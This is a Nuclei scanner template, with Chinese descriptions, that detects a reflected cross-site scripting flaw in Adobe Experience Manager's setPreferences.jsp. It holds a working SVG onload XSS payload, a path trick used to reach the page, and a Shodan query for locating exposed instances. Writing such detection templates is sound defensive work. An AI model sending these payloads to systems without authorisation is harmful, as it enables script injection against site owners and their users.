id: aem-setpreferences-xss

info:
  name: Adobe Experience Manager Cross Site Scripting 检测
  author: zinminphy0,dhiyaneshDK
  severity: high
  description: |
    该模板用于核查 Adobe Experience Manager Cross Site Scripting相关配置。该类问题通常源于配置页面、错误页或管理接口将用户可控输入未编码写入响应，导致浏览器执行非预期脚本。模板会向目标发送探测请求，并依据请求 `/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.dom...`、`/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(docu...`、匹配 `<svg/onload=confirm(document.domain);>`、`A JSONObject text must begin with`、状态码 400 等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可诱导用户访问构造链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作或辅助钓鱼。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://www.youtube.com/watch?v=VwLSUHNhrOw&t=142s
    - https://github.com/projectdiscovery/nuclei-templates/issues/3225
    - https://twitter.com/zin_min_phyo/status/1465394815042916352
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
    cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    shodan-query: http.component:"Adobe Experience Manager"
    product: experience_manager
    vendor: adobe
  tags: aem,xss,misconfig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a"
      - "{{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<svg/onload=confirm(document.domain);>"
          - 'A JSONObject text must begin with'
        condition: and

      - type: status
        status:
          - 400
